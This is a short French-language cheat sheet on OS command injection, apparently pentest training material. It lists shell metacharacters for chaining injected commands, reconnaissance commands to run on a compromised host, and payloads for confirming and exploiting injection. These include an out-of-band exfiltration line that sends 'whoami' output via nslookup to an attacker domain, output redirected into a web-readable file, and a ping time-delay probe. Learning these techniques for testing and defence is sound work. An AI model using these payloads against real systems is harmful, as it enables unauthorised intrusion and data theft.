# Cheatsheet sur l'Injection de Commandes OS (Command Injection)

## Méta-caractères de Shell

### Séparateurs de Commandes Communs sur Windows et Unix
- `&`
- `&&`
- `|`
- `||`

### Séparateurs de Commandes Spécifiques à Unix
- `;`
- `Newline (0x0a ou \n)`

### Inline Execution sur Unix
- `` `injected command` ``
- `$(injected command)`

## Comportements Particuliers
- Différents méta-caractères ont des comportements subtiles différents.

## Contexte entre Guillemets
- Terminer le contexte en utilisant `" ou '`.

## Commandes de Reconnaissance
Quand une vulnérabilité d'injection de commandes OS est identifiée, ces commandes peuvent être utiles pour obtenir des informations sur le système compromis.

### Linux et Windows
| But de la Commande     | Linux       | Windows      |
|------------------------|-------------|--------------|
| Nom de l'utilisateur   | `whoami`    | `whoami`     |
| Système d'exploitation | `uname -a`  | `ver`        |
| Configuration réseau   | `ifconfig`  | `ipconfig /all` |
| Connexions réseau      | `netstat -an`| `netstat -an`|
| Processus en cours     | `ps -ef`    | `tasklist`   |

## Exfiltration de Données
- Utiliser un canal hors bande pour exfiltrer les données.
  ```& nslookup `whoami`.kgji2ohoyw.web-attacker.com &```
  
- Rediriger la sortie vers un fichier que vous pouvez ensuite récupérer via le navigateur.
  ```& whoami > /var/www/static/whoami.txt &```

## Injection de Délai Temporel
- Utiliser une commande qui déclenche un délai temporel pour confirmer que la commande a été exécutée.
  ```& ping -c 10 127.0.0.1 &```

